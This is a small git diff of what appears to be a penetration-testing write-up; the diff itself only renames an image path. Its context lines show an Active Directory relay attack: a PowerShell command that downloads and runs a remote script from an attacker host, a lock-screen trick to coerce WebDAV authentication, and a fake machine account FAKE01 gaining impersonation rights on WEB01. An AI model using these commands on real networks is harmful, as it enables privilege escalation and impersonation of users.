@@ -103,7 +103,7 @@ iex (iwr http://192.168.248.3:8090/Change-Lockscreen.ps1 -usebasicparsing)
 change-lockscreen -webdav \\webdav@80\
 ```
 
-![](<../../../.gitbook/assets/image (1).png>)
+![](<../../../.gitbook/assets/image (1) (1).png>)
 
 When we check the ntlmrelay output we see that `FAKE01` can now impersonate users on `WEB01`.
 
